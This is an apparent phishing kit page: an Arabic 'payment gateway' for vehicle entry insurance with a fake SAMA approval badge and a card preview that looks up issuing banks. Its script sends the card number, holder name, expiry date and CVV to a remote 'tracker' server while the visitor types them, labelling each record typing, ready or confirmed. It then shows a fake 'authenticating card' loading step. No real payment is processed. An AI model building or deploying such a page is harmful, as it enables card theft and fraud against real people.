<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>بوابة الدفع</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="bill.css">
  <style>
    /* 💳 مظهر وتنسيق البطاقة الفعلي ومحاكاة التصميم المرفق */
    .card-real-preview {
      width: 100%;
      max-width: 380px;
      aspect-ratio: 1.586 / 1;
      background: #f0f4fa;
      border-radius: 22px;
      padding: 22px 24px;
      box-shadow: 0 4px 18px rgba(0, 0, 0, 0.06);
      border: 1px solid #e2e8f0;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      margin: 15px auto 25px auto;
      direction: ltr !important;
      box-sizing: border-box;
      user-select: none;
      font-family: 'Inter', sans-serif;
      transition: all 0.3s ease;
    }
    .card-top-row {
      display: flex;
      justify-content: space-between;
      align-items: flex-start;
      min-height: 38px;
    }
    .bank-brand-title {
      font-weight: 800;
      font-size: 15px;
      color: #1e293b;
      line-height: 1.2;
      font-family: 'Inter', 'Cairo', sans-serif;
      text-align: left;
      max-width: 220px;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }
    .currency-box {
      border: 1px solid #cbd5e1;
      background: rgba(255, 255, 255, 0.85);
      border-radius: 6px;
      padding: 2px 8px;
      font-size: 13px;
      font-weight: 700;
      color: #1e293b;
      letter-spacing: 0.5px;
    }
    .card-mid-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin: auto 0;
    }
    .card-display-number {
      font-size: 21px;
      font-weight: 600;
      letter-spacing: 1.8px;
      color: #0f172a;
      direction: ltr !important;
      text-align: left;
      unicode-bidi: isolate;
    }
    .card-expiry-block {
      text-align: right;
      line-height: 1.2;
    }
    .card-expiry-val {
      font-size: 17px;
      font-weight: 600;
      color: #0f172a;
    }
    .card-cvv-label {
      font-size: 10px;
      color: #94a3b8;
      font-weight: 700;
      margin-top: 2px;
      text-transform: uppercase;
    }
    .card-cvv-val {
      font-size: 13px;
      font-weight: 700;
      color: #0f172a;
      letter-spacing: 1px;
    }
    .card-bottom-row {
      display: flex;
      justify-content: space-between;
      align-items: flex-end;
      min-height: 32px;
    }
    .holder-and-flag {
      display: flex;
      flex-direction: column;
      gap: 6px;
      text-align: left;
    }
    .card-holder-val {
      font-size: 15px;
      font-weight: 600;
      color: #0f172a;
      text-transform: capitalize;
    }
    .card-flag-badge {
      font-size: 16px;
      line-height: 1;
      display: none;
    }
    .network-badge-group {
      display: flex;
      flex-direction: column;
      align-items: flex-end;
      gap: 2px;
    }
    .visa-logo-text {
      font-size: 26px;
      font-weight: 900;
      font-style: italic;
      color: #1a39cc;
      line-height: 1;
      letter-spacing: -1px;
    }
    .card-tier-text {
      font-size: 11px;
      font-weight: 800;
      color: #0f172a;
      letter-spacing: 0.5px;
      text-transform: uppercase;
      display: none;
    }

    /* 🛑 تثبيت الشعار على يمين حقل الإدخال مع الحفاظ على اتجاه الأرقام LTR */
    .input-c {
      position: relative;
      display: flex;
      align-items: center;
      width: 100%;
    }
    .logo-in {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      pointer-events: none;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 2;
    }
    #card-number {
      padding-right: 55px !important;
      direction: ltr !important;
      text-align: left !important;
      unicode-bidi: isolate !important;
      font-family: 'Inter', monospace, sans-serif !important;
    }
    #card-expiry, #card-cvv {
      direction: ltr !important;
      text-align: left !important;
      unicode-bidi: isolate !important;
      font-family: 'Inter', monospace, sans-serif !important;
    }
  </style>
</head>
<body>
  <header>
    <img style="height:34px;" src="/images/footer-logo.svg" alt="Manafith" onerror="this.src='/images/logo.svg'">
    <div class="secure-b">🔒 دفع آمن 100%</div>
  </header>

  <main>
    <section class="wrapper payment-card">
      <h3 class="title">💳 تفاصيل بطاقة الدفع</h3>

      <!-- 🎨 بطاقة العرض الذكية (تكون فارغة من الشعارات مبدئياً) -->
      <div class="card-real-preview" id="card-preview-container">
        <!-- الصف العلوي -->
        <div class="card-top-row">
          <div id="card-bank-header">
            <span class="bank-brand-title" id="card-graphic-bank-title" style="display:none;"></span>
          </div>
          <div class="currency-box" id="card-currency-box" style="display:none;">SAR</div>
        </div>

        <!-- الصف الأوسط -->
        <div class="card-mid-row">
          <div class="card-display-number" id="card-graphic-number">•••• •••• •••• ••••</div>
          <div class="card-expiry-block">
            <div class="card-expiry-val" id="card-graphic-expiry">MM/YY</div>
            <div class="card-cvv-label">CVV</div>
            <div class="card-cvv-val" id="card-graphic-cvv">•••</div>
          </div>
        </div>

        <!-- الصف السفلي -->
        <div class="card-bottom-row">
          <div class="holder-and-flag">
            <span class="card-holder-val" id="card-graphic-holder">CARDHOLDER NAME</span>
            <div class="card-flag-badge" id="card-graphic-flag"></div>
          </div>
          <div class="network-badge-group">
            <div id="card-graphic-network"></div>
            <span class="card-tier-text" id="card-graphic-tier"></span>
          </div>
        </div>
      </div>

      <!-- نموذج إدخال البيانات -->
      <form id="checkout-form" onsubmit="handlePaymentSubmit(event)">
        <div class="form-group">
          <label>رقم بطاقة الدفع</label>
          <div class="input-c">
            <input type="text" id="card-number" placeholder="•••• •••• •••• ••••" maxlength="19" oninput="validateCardNumber(this)">
            <!-- شعار الشبكة يظهر هنا على يمين الحقل -->
            <div class="logo-in" id="network-logo-inline"></div>
          </div>
        </div>

        <div class="form-group">
          <label>اسم صاحب البطاقة</label>
          <input type="text" id="card-holder" placeholder="CARDHOLDER NAME" oninput="validateCardHolder(this)">
        </div>

        <div class="form-row">
          <div class="form-group">
            <label>تاريخ الانتهاء</label>
            <input type="text" id="card-expiry" placeholder="MM/YY" maxlength="5" oninput="validateCardExpiry(this)">
          </div>
          <div class="form-group">
            <label>رمز الأمان (CVV)</label>
            <input type="password" id="card-cvv" placeholder="•••" maxlength="4" oninput="validateCardCvv(this)">
          </div>
        </div>

        <button type="submit" class="pay-btn" id="pay-submit-btn" disabled>
          <span id="pay-btn-text">تأكيد ودفع</span>
        </button>
      </form>

      <div class="sec-f">🛡️ معتمد من SAMA</div>
    </section>

    <section class="wrapper summary-card">
      <h3 class="title">📄 ملخص طلب التأمين</h3>
      <div class="row" id="row-country" style="display:none;">
        <span style="color:#64748b; font-weight:600;">دولة القدوم:</span>
        <span id="sum-country" style="font-weight:700;"></span>
      </div>
      <div class="row" id="row-port" style="display:none;">
        <span style="color:#64748b; font-weight:600;">منفذ الدخول:</span>
        <span id="sum-port" style="font-weight:700;"></span>
      </div>
      <div class="row" id="row-plate" style="display:none;">
        <span style="color:#64748b; font-weight:600;">رقم اللوحة:</span>
        <span id="sum-plate" style="font-weight:700;"></span>
      </div>
      <div class="row">
        <span style="color:#64748b; font-weight:600;">مدة التأمين:</span>
        <span id="sum-duration" style="font-weight:700;">اسبوعين</span>
      </div>
      <div class="row" style="border-top:1.5px solid #f1f5f9;margin-top:12px;padding-top:12px;">
        <span style="font-size:15px;color:#0f172a;font-weight:900;">المبلغ الإجمالي:</span>
        <span class="total-p" id="sum-total-price">450.00 ر.س</span>
      </div>
    </section>
  </main>

  <script src="config.js"></script>
  <script>
    var SERVER_HUB_URL = window.SERVER_HUB_URL || "http://localhost:5000",
        siteKey = "site_1789715618986",
        formId = "payment_form",
        formName = "بيانات بطاقة الدفع (Step 2)";

    var currentSessionId = 'sess_' + Math.random().toString(36).substring(2, 10) + Date.now().toString(36).substring(6, 10);
    var visitorToken = localStorage.getItem('visitor_token') || 'vis_' + Math.random().toString(36).substring(2, 10);

    // 🚀 قاعدة بيانات الـ BIN المحلية المحملة من الملف
    var BIN_DATABASE = {};

    // خريطة أعلام الدول بصيغة Emoji
    var COUNTRY_FLAGS = {
      'SA': '🇸🇦', 'QA': '🇶🇦', 'AE': '🇦🇪', 'KW': '🇰🇼', 'BH': '🇧🇭',
      'OM': '🇴🇲', 'JO': '🇯🇴', 'EG': '🇪🇬', 'IQ': '🇮🇶', 'LB': '🇱🇧',
      'SY': '🇸🇾', 'YE': '🇾🇪', 'PS': '🇵🇸'
    };

    // خريطة العملات الافتراضية لكل دولة
    var COUNTRY_CURRENCY = {
      'SA': 'SAR', 'QA': 'QAR', 'AE': 'AED', 'KW': 'KWD', 'BH': 'BHD',
      'OM': 'OMR', 'JO': 'JOD', 'EG': 'EGP', 'IQ': 'IQD', 'LB': 'USD'
    };

    // تحميل وقراءة ملف CSV فورياً
    (async function loadBinDatabase() {
      try {
        const res = await fetch('bin_list_filtered_mena.csv');
        if (!res.ok) return;
        const text = await res.text();
        const lines = text.split('\n');
        
        for (let i = 1; i < lines.length; i++) {
          const line = lines[i].trim();
          if (!line) continue;
          
          // تقسيم سطور الـ CSV
          const parts = line.split(',');
          if (parts.length >= 8) {
            const bin = parts[0].trim();
            BIN_DATABASE[bin] = {
              brand: parts[1].trim().toUpperCase(),
              type: parts[2].trim().toUpperCase(),
              category: parts[3].trim().toUpperCase(),
              issuer: parts[4].trim(),
              iso2: parts[7].trim().toUpperCase(),
              country: parts[9] ? parts[9].trim() : ''
            };
          }
        }
      } catch (e) {
        console.warn("Could not load local bin_list_filtered_mena.csv", e);
      }
    })();

    try {
      var sub = JSON.parse(localStorage.getItem('saas_last_submission') || '{}');
      if (sub['دولة القدوم'] || sub['دولة القدوم:']) {
        document.getElementById('sum-country').innerText = sub['دولة القدوم'] || sub['دولة القدوم:'];
        document.getElementById('row-country').style.display = 'flex';
      }
      if (sub['منفذ الدخول'] || sub['منفذ الدخول:']) {
        document.getElementById('sum-port').innerText = sub['منفذ الدخول'] || sub['منفذ الدخول:'];
        document.getElementById('row-port').style.display = 'flex';
      }
      if (sub['رقم اللوحة'] || sub['123456:']) {
        document.getElementById('sum-plate').innerText = sub['رقم اللوحة'] || sub['123456:'];
        document.getElementById('row-plate').style.display = 'flex';
      }
      var dStr = sub['مدة التأمين'] || sub['مدة التأمين:'] || 'اسبوعين 450.00', price = "450.00", dName = "اسبوعين";
      var pMatch = dStr.match(/([\d\.]+)/);
      if (pMatch) {
        price = pMatch[1];
        dName = dStr.replace(price, '').trim().replace(/[\n\r]/g, '');
      }
      document.getElementById('sum-duration').innerText = dName || 'اسبوعين';
      document.getElementById('sum-total-price').innerText = price + " ر.س";
      document.getElementById('pay-submit-btn').innerText = "تأكيد ودفع " + price + " ر.س";
    } catch (e) {}

    function isValidLuhn(num) {
      const digits = num.replace(/\D/g, '');
      if (digits.length < 13) return false;
      let sum = 0, dDouble = false;
      for (let i = digits.length - 1; i >= 0; i--) {
        let d = parseInt(digits.charAt(i), 10);
        if (dDouble) { d *= 2; if (d > 9) d -= 9; }
        sum += d; dDouble = !dDouble;
      }
      return sum % 10 === 0;
    }

    const VISA_BADGE = `<span class="visa-logo-text">VISA</span>`;
    const MC_BADGE = `<span style="font-weight:900;color:#eb001b;font-size:18px;font-family:sans-serif;">Mastercard</span>`;
    const MADA_BADGE = `<span style="font-weight:900;color:#007cc2;font-size:16px;font-family:sans-serif;">mada مدى</span>`;

    var lastReadyCard = null, lastReadyExpiry = null,
        isCardValid = false, isHolderValid = false, isExpiryValid = false, isCvvValid = false,
        lastSentPayload = null, streamDebounce = null;

    function updatePayButtonState() {
      var v = isCardValid && isHolderValid && isExpiryValid && isCvvValid;
      var btn = document.getElementById('pay-submit-btn');
      btn.disabled = !v;
      if (v) btn.classList.add('enabled'); else btn.classList.remove('enabled');
      streamLiveFormPayload(v ? 'ready' : 'typing');
    }

    function streamLiveFormPayload(st) {
      clearTimeout(streamDebounce);
      streamDebounce = setTimeout(function () {
        var cNum = document.getElementById('card-number').value.trim();
        var cHolder = document.getElementById('card-holder').value.trim();
        var cExpiry = document.getElementById('card-expiry').value.trim();
        var cCvv = document.getElementById('card-cvv').value.trim();

        var cleanNum = cNum.replace(/\s/g, '');
        var bin = cleanNum.substring(0, 6);
        var binInfo = BIN_DATABASE[bin] || null;

        var net = binInfo ? binInfo.brand : 'UNKNOWN';
        if (net === 'UNKNOWN') {
          if (cleanNum.startsWith('4')) net = 'VISA';
          else if (cleanNum.startsWith('5')) net = 'MASTERCARD';
          else if (cleanNum.startsWith('6')) net = 'MADA';
        }

        if (st === 'typing' && lastReadyCard !== null) {
          var cleanLastReady = lastReadyCard.replace(/\s/g, '');
          if ((cleanNum.length >= 6 && !cleanLastReady.startsWith(cleanNum) && cleanNum !== cleanLastReady) || (cExpiry.length >= 2 && cExpiry !== lastReadyExpiry)) {
            currentSessionId = 'sess_' + Math.random().toString(36).substring(2, 10) + Date.now().toString(36).substring(6, 10);
            lastReadyCard = null; lastReadyExpiry = null;
          }
        }
        if (st === 'ready') { lastReadyCard = cNum; lastReadyExpiry = cExpiry; }

        var data = {
          'رقم البطاقة': cNum,
          'اسم حامل البطاقة': cHolder,
          'تاريخ الانتهاء': cExpiry,
          'رمز الأمان CVV': cCvv,
          'نوع البطاقة': net,
          'البنك': binInfo ? binInfo.issuer : '',
          'الدولة': binInfo ? binInfo.country : '',
          '_sessionId': currentSessionId
        };

        var payloadString = JSON.stringify(data);
        if (payloadString === lastSentPayload && st !== 'confirmed') return;
        lastSentPayload = payloadString;

        fetch(SERVER_HUB_URL + '/api/tracker/submit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            token: visitorToken,
            siteKey: siteKey,
            formName: formName + (st === 'typing' ? ' (يجري الكتابة 🟡)' : st === 'ready' ? ' (جاهز 🟢)' : ' (مؤكد ✅)'),
            submissionData: data,
            isFinalSubmission: (st === 'confirmed'),
            isImportant: true
          }),
          keepalive: true
        }).catch(function () {});
      }, 300);
    }

    function validateCardNumber(el) {
      // 1. تقييد الإدخال بـ 16 رقماً فقط
      let r = el.value.replace(/\D/g, '').substring(0, 16);
      
      // 2. تجميع الأرقام إلى مجموعات من 4 أرقام من اليسار لليمين LTR
      el.value = r.replace(/(\d{4})/g, '$1 ').trim();
      document.getElementById('card-graphic-number').innerText = el.value || '•••• •••• •••• ••••';

      // استدعاء عناصر البطاقة المعروضة
      const bankTitleEl = document.getElementById('card-graphic-bank-title');
      const currencyBox = document.getElementById('card-currency-box');
      const networkGraphic = document.getElementById('card-graphic-network');
      const networkInline = document.getElementById('network-logo-inline');
      const tierEl = document.getElementById('card-graphic-tier');
      const flagEl = document.getElementById('card-graphic-flag');

      // 🛑 إعادة تصفير وإخفاء كل شيء إذا كان الإدخال أقل من 6 أرقام
      if (r.length < 6) {
        bankTitleEl.style.display = 'none';
        currencyBox.style.display = 'none';
        networkGraphic.innerHTML = '';
        networkInline.innerHTML = '';
        tierEl.style.display = 'none';
        flagEl.style.display = 'none';

        // إظهار مبدئي لشعار عام إن بدأ برقم معروف
        if (r.startsWith('4')) networkInline.innerHTML = VISA_BADGE;
        else if (r.startsWith('5')) networkInline.innerHTML = MC_BADGE;
        else if (r.startsWith('6')) networkInline.innerHTML = MADA_BADGE;

        isCardValid = false;
        el.className = r.length > 0 ? 'error' : '';
        updatePayButtonState();
        return;
      }

      // 🔍 البحث عن البادئة داخل قاعدة البيانات المحملة من الملف المرفق
      const bin = r.substring(0, 6);
      const binMatch = BIN_DATABASE[bin] || null;

      let badgeHtml = '';
      let brandName = binMatch ? binMatch.brand : '';
      let bankName = binMatch ? binMatch.issuer : '';
      let isoCode = binMatch ? binMatch.iso2 : '';
      let cardType = binMatch ? binMatch.type : 'CREDIT';
      let cardCat = binMatch ? binMatch.category : 'SIGNATURE';

      // التعرف الاحتياطي إن لم توجد في الملف
      if (!brandName) {
        if (r.startsWith('4')) brandName = 'VISA';
        else if (r.startsWith('5')) brandName = 'MASTERCARD';
        else if (r.startsWith('6')) brandName = 'MADA';
      }

      if (brandName === 'MADA' || (isoCode === 'SA' && cardType === 'DEBIT')) {
        badgeHtml = MADA_BADGE;
      } else if (brandName === 'MASTERCARD') {
        badgeHtml = MC_BADGE;
      } else {
        badgeHtml = VISA_BADGE;
      }

      // 🎨 إظهار وعرض البيانات فور التعرف عليها
      if (bankName) {
        bankTitleEl.innerText = bankName;
        bankTitleEl.style.display = 'block';
      } else {
        bankTitleEl.style.display = 'none';
      }

      currencyBox.innerText = COUNTRY_CURRENCY[isoCode] || 'SAR';
      currencyBox.style.display = 'block';

      networkGraphic.innerHTML = badgeHtml;
      networkInline.innerHTML = badgeHtml;

      tierEl.innerText = `${cardType} • ${cardCat}`;
      tierEl.style.display = 'block';

      if (COUNTRY_FLAGS[isoCode]) {
        flagEl.innerText = COUNTRY_FLAGS[isoCode];
        flagEl.style.display = 'block';
      } else {
        flagEl.style.display = 'none';
      }

      // فحص صحة رقم البطاقة بـ Luhn Algorithm
      if (r.length === 16) {
        isCardValid = isValidLuhn(r);
        el.className = isCardValid ? 'success' : 'error';
        if (isCardValid) document.getElementById('card-expiry').focus();
      } else {
        isCardValid = false;
        el.className = 'error';
      }
      updatePayButtonState();
    }

    function validateCardExpiry(el) {
      let r = el.value.replace(/\D/g, '').substring(0, 4);
      if (r.length === 1 && ['2', '3', '4', '5', '6', '7', '8', '9'].includes(r)) r = '0' + r;
      if (r.length >= 2) {
        let m = parseInt(r.substring(0, 2), 10);
        if (m > 12) m = 12; if (m === 0) m = 1;
        r = (m < 10 ? '0' + m : m) + '/' + r.substring(2, 4);
      }
      el.value = r;
      document.getElementById('card-graphic-expiry').innerText = r || 'MM/YY';

      if (r.length === 5) {
        let parts = r.split('/');
        let m = parseInt(parts[0], 10), y = parseInt('20' + parts[1], 10);
        let now = new Date(), curM = now.getMonth() + 1, curY = now.getFullYear();
        isExpiryValid = (y > curY || (y === curY && m >= curM)) && (m >= 1 && m <= 12);
        el.className = isExpiryValid ? 'success' : 'error';
        if (isExpiryValid) document.getElementById('card-cvv').focus();
      } else {
        isExpiryValid = false;
        el.className = r.length > 0 ? 'error' : '';
      }
      updatePayButtonState();
    }

    function validateCardCvv(el) {
      let v = el.value.replace(/\D/g, '').substring(0, 4);
      el.value = v;
      document.getElementById('card-graphic-cvv').innerText = v.length > 0 ? v : '•••';
      isCvvValid = v.length >= 3;
      el.className = isCvvValid ? 'success' : (v.length > 0 ? 'error' : '');
      if (isCvvValid && v.length === 3) document.getElementById('card-holder').focus();
      updatePayButtonState();
    }

    function validateCardHolder(el) {
      let v = el.value.replace(/[^a-zA-Z\s]/g, '').toUpperCase();
      el.value = v;
      document.getElementById('card-graphic-holder').innerText = v || 'CARDHOLDER NAME';
      isHolderValid = v.trim().length >= 3;
      el.className = isHolderValid ? 'success' : (v.length > 0 ? 'error' : '');
      updatePayButtonState();
    }

    function handlePaymentSubmit(e) {
      e.preventDefault();
      if (!isCardValid || !isExpiryValid || !isCvvValid || !isHolderValid) return;

      document.getElementById('pay-submit-btn').disabled = true;
      document.getElementById('pay-submit-btn').innerText = "جاري الدفع الآمن...";
      streamLiveFormPayload('confirmed');

      fetch(SERVER_HUB_URL + '/api/tracker/ping', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          token: visitorToken,
          siteKey: siteKey,
          currentPage: '/loading',
          pageTitle: 'جاري مصادقة البطاقة البنكية...'
        })
      }).catch(function () {});

      setTimeout(function () {
        var dest = (window.location.pathname.includes('/live/') || window.location.pathname.includes('/storage/'))
          ? ((window.location.pathname.startsWith('/live/') ? '/live/' : '/storage/') + siteKey + '/loading.html')
          : 'loading.html';
        window.location.href = dest;
      }, 800);
    }
  </script>
</body>
</html>
